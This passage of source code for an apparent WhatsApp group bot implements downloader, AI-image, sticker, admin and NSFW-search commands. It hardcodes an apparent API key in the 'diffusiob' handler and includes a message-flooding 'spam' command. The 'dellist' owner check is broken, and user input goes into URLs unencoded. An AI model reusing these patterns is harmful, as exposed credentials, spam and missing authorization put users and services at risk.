*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                DeepakBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!m.quoted) return replygcdeepak('Reply Message!')
                if (!m.quoted.fileSha256) return replygcdeepak('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygcdeepak('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygcdeepak('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return replygcdeepak(`Example ${prefix+command} link`)
await DeepakStickWait()
let krt = await scp2.ssweb(q)
DeepakBotInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    replygcdeepak(pickupLine)
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    DeepakBotInc.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'dalle': {
  if (!text) return replygcdeepak(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  try {
  	replygcdeepak('*Please wait, generating image...*')
    const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await DeepakBotInc.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
    } else {
      throw '*Image generation failed*';
    }
  } catch {
    replygcdeepak('*Oops! Something went wrong while generating images. Please try again later.*')
  }
  }
  break
  case 'translate':{
  	if (!q) return replygcdeepak(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       replygcdeepak(result.text)
    } catch (e) {
        return replygcdeepak(err)
    } 
    }
  break
  case 'mediafire': {
  	if (!args[0]) return replygcdeepak(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return replygcdeepak(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    DeepakBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return DeepakStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    DeepakBotInc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'addlist':
if (!DeepakTheCreator) return DeepakStickOwner()
if (!m.isGroup) return DeepakStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcdeepak(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return replygcdeepak(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
replygcdeepak(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
replygcdeepak(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!DeepakBotInc) return DeepakStickOwner()
if (!m.isGroup) return DeepakStickGroup()
if (db_respon_list.length === 0) return replygcdeepak(`There is no message list in the database yet`)
if (!q) return replygcdeepak(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return replygcdeepak(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
replygcdeepak(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n┋⍟┃\n'
for (let x of db_respon_list) {
teks += `┋⍟┃⭔ ${x.key}\n`
}
teks += `┋⍟┃\n└────────────⭓\n\n`
replygcdeepak(teks)
}
break
case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygcdeepak(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygcdeepak(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygcdeepak(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      DeepakBotInc.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      DeepakBotInc.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
case 'gimage':{
if (!text) return replygcdeepak(`Usage: ${prefix}gimage DGDEEPAK github`);
DeepakBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await DeepakBotInc.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
DeepakBotInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
DeepakBotInc.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case 'removebg': case 'nobg':{
if (!quoted) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
await DeepakBotInc.sendMessage(m.chat, {image: {url: data.url.result}, caption: `Here u go!`}, {quoted: m})
}
break
case'tozombie':{
if (!quoted) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await DeepakBotInc.sendMessage(m.chat, {image: {url: data.url}, caption: `Here u go!`}, {quoted: m})
}
break
case 'capcut':{
if (!text) return replygcdeepak(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `Here u go!`}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcdeepak(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')

atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)

mem = await TelegraPh(mee)

meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`

memek = await DeepakBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })


} else {
replygcdeepak(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}

break

case'smeta': {
if (!/webp/.test(mime)) return replygcdeepak('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcdeepak('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) DeepakBotInc.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcdeepak('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
case 'instagram2': case 'ig2':{
if (!text) return replygcdeepak(`Enter the link!!!`)
if (!isUrl(args[0])) return replygcdeepak(`Where is the link?`)
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{   
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `Here you go!` }, { quoted: m })
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'itunes': {
if (!text) return replygcdeepak('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      await DeepakBotInc.sendMessage(m.chat, {image: {url:json.thumbnail}, caption: songInfo}, {quoted: m})
    } else {
      replygcdeepak(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'spam':
				if (!DeepakTheCreator) return DeepakStickOwner()
					if (!text) return replygcdeepak(`Use ${prefix +command} text|amount`)
				deepakarg = text.split("|")
				if (!deepakarg) return replygcdeepak(`Use ${prefix+ command} text|amount`)
				if (Number(deepakarg[1]) >= 50) return replygcdeepak('Max 50!')
				if (isNaN(deepakarg[1])) return replygcdeepak(`must be a number`)
				for (let i = 0; i < deepakarg[1]; i++){
					DeepakBotInc.sendMessage(from, {text: deepakarg[0]})
				}
				break
case 'simisimi': case 'simi':
if (!text) replygcdeepak('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
DeepakBotInc.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'clearall': {
if (!DeepakTheCreator) return DeepakStickOwner()
DeepakBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!DeepakTheCreator) return DeepakStickOwner()
if (m.isGroup) return DeepakStickPrivate()
DeepakBotInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!DeepakTheCreator) return DeepakStickOwner()
if (m.isGroup) return DeepakStickPrivate()
DeepakBotInc.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
if (!DeepakTheCreator) return DeepakStickOwner()
totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    replygcdeepak(`*${totalreg} users using Bot*`)
}
break 
case 'getjoinrequest':{
	if (!m.isGroup) return DeepakStickGroup()
	if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
	const response = await DeepakBotInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    DeepakBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  DeepakBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replygcdeepak(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcdeepak('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
DeepakBotInc.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	replygcdeepak(`Verify that the link is from Twitter`)
	}
}
break
case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
  if (!text) return replygcdeepak(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return replygcdeepak('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        DeepakBotInc.sendMessage(
          m.chat,
          {video: Buffer.from(buffer),
          caption: `Here you go!!\nTitle: ${title}`} ); 
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygcdeepak('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          replygcdeepak(`*Search Results for "${text}":*\n\n${searchResults}`);
        }
      }
    } catch (error) {
      console.error(error);
      return replygcdeepak('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
  if (!text)
    return replygcdeepak(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
        DeepakBotInc.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        replygcdeepak('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      replygcdeepak('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        replygcdeepak(message, null, {
          contextInfo: {
            mentionJid: DeepakBotInc.parseMention(message),
          },
        })
      } else {
        replygcdeepak('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      replygcdeepak('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
break
case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcdeepak(gitaVerse)
    if (json.audio_link) {
      DeepakBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
case 'apk': {
	try {
    if (command === 'apk') {
      if (!text) return replygcdeepak(`*[❗] Please provide the APK Name you want to download.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await DeepakBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
        return await DeepakBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      await DeepakBotInc.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygcdeepak(`*[❗] An error occurred. Make sure to provide a valid link.*`);
  }
};
break
case 'mega':{
	try {
if (!text) return replygcdeepak(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcdeepak('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcdeepak(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await DeepakBotInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcdeepak(`Error: ${error.message}`);
    }
}
break
case 'diffusiob':{
if (!text) return replygcdeepak('What do u want to make?')
    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    let raw = JSON.stringify({
        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
        "prompt": text,
        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
        "width": "720",
        "height": "720",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": "yes",
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    try {
        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let result = await response.json();
        DeepakBotInc.sendMessage(m.chat, { image: { url: result.output[0] }, caption: result.meta.prompt }, { quoted: m });
    } catch (error) {
        console.log('error', error);
        DeepakBotInc.sendMessage(m.chat, { image: { url: `${error.config.url}` }, caption: text }, { quoted: m });
    }
}
break
case 'indo-ai': {
	if (!text) return replygcdeepak(`*• Example:* ${prefix + command} halo`)
try {
let gpt = await (await fetch(`https://itzpire.site/ai/gpt-web?q=${text}`)).json()
replygcdeepak("*[ Indo-Ai ]* " + '\n' + gpt.result)
 } catch(e) {
 return replygcdeepak("`*Error*`")
}
}
break
case 'photoleap': {
	if (!text) return replygcdeepak(`*• Example:* ${usedPrefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygcdeepak("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    DeepakBotInc.sendMessage(m.chat, {image: { url: gpt.result_url}, caption: text}, {quoted: m});
  } catch(e) {
    return replygcdeepak("`*Error*`");
  }
}
break
case 'ai':
case 'openai': {
	if (!text) return replygcdeepak(`*• Example:* ${prefix + command} what is your name`);   
        let name = DeepakBotInc.getName(m.sender);
        try {
            const response = await axios.post("https://deepenglish.com/wp-json/ai-chatbot/v1/chat", {
                messages: [
                    { role: "system", content: `${name}` },
                    { role: "user", content: text }
                ]
            });
            const hasil = response.data;   
            replygcdeepak(hasil.answer);
        } catch (error) {
            console.error("Error fetching data:", error);
            return replygcdeepak(error);
        }
    }
    break
case 'wikipedia': case 'wiki': {
	if (!text) return replygcdeepak(` Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	replygcdeepak(`▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`)
} catch (e) {
  replygcdeepak('⚠️ No results found ')
}
}
break
case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygcdeepak("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygcdeepak("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    await DeepakBotInc.sendMessage(m.chat, {video: {url: video}, caption: message},{quoted: m});
  } catch (error) {
    console.error("Error:", error);
    replygcdeepak("*Error: Could not track the anime or send the video.*");
  }
};
break
case 'stickersearch': {
if (!text) return replygcdeepak(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
replygcdeepak(`
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break
case 'apksearch': {
if (!text) return replygcdeepak(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await DeepakBotInc.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    DeepakBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygcdeepak(`Total Features of ${botname} is ${deepakfeature()}`)
        break
                    case 'menu':
            case 'help': {
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh = `𝗭𝗘𝗡𝗜𝗧𝗦𝗨-𝗠𝗗 𝗠𝗘𝗡𝗨* 
*Hi👋, ${pushname}, 
${deepaktimewisher}}️* 😄${readmore}

*╭─────❂* 𝗨𝗦𝗘𝗥-𝗜𝗡𝗙𝗢 *❂───❂*
╏✺╭─────────────❂
┋⍟┃🙇𝗡𝗮𝗺𝗲 : ${pushname}
┋⍟┃📠𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split('@')[0]}
┋⍟┃📟𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
┋⍟┃🧾𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : '-'}
┋⍟┃📞𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
┋⍟╰──────────────❂
*╰───────────────────❂*

*╭─────❂* 𝗧𝗜𝗠𝗘-𝗜𝗡𝗙𝗢 *❂───❂*
╏✺╭─────────────❂
┋⍟┃⌚𝗧𝗶𝗺𝗲 : ${xtime}
┋⍟┃🗓️𝗗𝗮𝘁𝗲 : ${xdate} 
┋⍟╰──────────────❂
╰───────────────────❂

*╭─────❂* 𝗕𝗢𝗧-𝗜𝗡𝗙𝗢 *❂───❂*
╏✺╭─────────────❂
┋⍟┃🪀️𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 7.0.0
┋⍟┃🚅𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
┋⍟┃⏰𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
┋⍟┃🤖𝗕𝗼𝘁 : ${botname}
┋⍟┃💬𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
┋⍟┃💡𝗠𝗼𝗱𝗲 : ${DeepakBotInc.public ? 'Public' : `Self`}
┋⍟┃🖥️𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
┋⍟┃📱𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
┋⍟┃🙋𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
┋⍟┃🙅𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
┋⍟┃🧾𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc
┋⍟╰──────────────❂
*╰──────❂✧𝑾𝒂-𝑩𝒐𝒕✧❂─────❂*

*✧𝙇𝙞𝙨𝙩 𝙊𝙛 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨✧*

*╭────❂* *Owner Menu* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}autoread 
┋⍟┃ ${prefix}autobio 
┋⍟┃ ${prefix}autotype 
